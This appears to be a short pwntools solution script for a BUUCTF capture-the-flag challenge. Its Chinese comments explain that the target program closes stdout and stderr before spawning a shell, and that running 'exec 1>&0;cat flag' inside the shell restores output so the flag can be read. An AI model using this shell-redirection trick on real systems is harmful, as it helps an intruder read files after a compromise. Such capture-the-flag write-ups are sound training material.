from pwn import *

'''
    int vulnerable()
    {
      puts("HaHaHa!\nWhat else can you do???");
      close(1);
      close(2);
      return shell();
    }

    之后查看了close()这个函数的作用是什么，发现是1是正常输出，2是错误输出，之后返回的是shell，
    那么我们获取shell以后直接进行重定向进行输出即可参考文章链接: linux重定向，
    获取shell之后在终端输入exec 1>&0即可实现重定向
    
    补充知识：
        exec 也就是重定位在Linux里面exec 1>&0的意思就是将标准输出定位到标准输入的文件.&+文件描述符,
        可以指代该文件(进程)而在同一个进程里面,标准输出和标准输入的指向都是相同的终端.
        由于标准输入没有被禁用所以这句话简单来说就是,重启了标准输出后你可以输出了

'''

target = remote('node4.buuoj.cn', 27828)
target.interactive()
# 现在已经获取shell了，在终端输入: exec 1>&0;cat flag
